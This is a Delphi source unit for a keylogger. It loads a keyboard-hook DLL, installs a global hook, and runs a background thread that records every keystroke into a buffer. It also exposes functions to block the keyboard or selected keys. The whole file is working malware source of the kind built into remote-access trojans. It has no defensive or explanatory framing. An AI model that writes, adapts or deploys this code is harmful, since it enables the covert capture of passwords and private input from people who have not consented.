Unit KeyLog;
Interface
Var
	KL_CPos		:Byte;
	KL_CChar		:String[255];
	KL_Online		:Boolean;
Function ToggleKeyboard:Boolean;
Procedure SetIgnoreKeys(S:String);
procedure StartLogger(filename:string);
Implementation
Uses Windows, SysUtils, Messages, Dialogs;
Type
	TInstallKeybHook	= Function:HHook StdCall;
	TGetLastKey		= Procedure(Var C:Char) StdCall;
	TSetBlocking		= Procedure(KeysBlocked:ShortString; KeyboardBlocked:Boolean) StdCall;
Var
	DLLFilename		:String;
	DLL,F			:DWord;
	InstallKeybHook	:TInstallKeybHook;
	GetLastKey		:TGetLastKey;
	SetBlocking		:TSetBlocking;
	Ignores			:ShortString;
	TK				:Boolean;
Procedure KeyloggerThread(GetLastKey:TGetLastKey); StdCall;
	Var
		C	:Char;
		T	:Text;
	Begin
		{$I-}
		Try
		Except
		End;
		SetThreadPriority(GetCurrentThread,THREAD_PRIORITY_BELOW_NORMAL);
		Repeat
			GetLastKey(C);
			If C > #0 then Begin
				Asm
					CLI
				End;
				Inc(KL_CPos);
				KL_CChar[KL_CPos] := C;
				Asm
					STI
				End;
				Try
				Except
				End;
			End;
		Until False;
		{$I+}
	End;
Function ToggleKeyboard:Boolean;
	Begin
		TK := not TK;
		SetBlocking(Ignores,TK);
		Result := TK;
	End;
Procedure SetIgnoreKeys(S:String);
	Begin
		Ignores := S;
		SetBlocking(Ignores,TK);
	End;

procedure StartLogger(filename:string);
begin
 // Load and activate keyhook DLL
 DLLFilename := filename;
 DLL := LoadLibraryEx(PChar(DLLFilename),0,0);
 InstallKeybHook := GetProcAddress(DLL,'KbdHook_InstallKeybHook');
 GetLastKey := GetProcAddress(DLL,'KbdHook_GetLastKey');
 SetBlocking := GetProcAddress(DLL,'KbdHook_SetBlocking');
 KL_Online := not ((DLL = 0) or (@InstallKeybHook = Nil) or (@GetLastKey = Nil) or (@SetBlocking = Nil));
 If KL_Online then Begin
  InstallKeybHook;
  CreateThread(Nil,0,@KeyloggerThread,@GetLastKey,0,F);
 end;
end;
End.
